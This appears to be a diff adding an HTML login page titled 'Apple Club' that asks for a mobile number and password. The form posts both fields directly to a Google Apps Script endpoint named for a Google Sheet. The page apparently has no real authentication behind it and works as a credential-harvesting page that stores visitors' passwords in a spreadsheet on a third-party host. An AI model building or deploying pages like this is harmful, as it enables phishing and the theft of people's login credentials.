@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css">
+    <link rel="stylesheet" href="./style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat&display=swap" rel="stylesheet">
+    <title>Apple Club</title>
+</head>
+
+<body>
+    <section class="side">
+        <img src="./images/img.svg" alt="">
+    </section>
+
+    <section class="main">
+        <div class="login-container">
+
+            <p class="title">Welcome</p>
+            <div class="separator"></div>
+            <p class="welcome-message"></p>
+
+            <form method="POST"
+                action="https://script.google.com/macros/s/AKfycbzy-Ip4egaomgdnN0EGUUsOT02PWZbPdhnZZMMbqumoWYeu4WD6zr2k7toL6KiWPS_BhQ/exec"
+                name="google-sheet">
+                <div class="form-control">
+                    <input type="Number" placeholder="Mobile Number" name="Number" required>
+                    <i class="fas fa-mobile"></i>
+                </div>
+                <div class="form-control">
+                    <input name="Password" type="password" placeholder="Password" name="Password" required>
+                    <i class="fas fa-lock"></i>
+                </div>
+
+                <button type="submit" class="submit">Login</button>
+            </form>
+        </div>
+    </section>
+
+</body>
+
+</html>
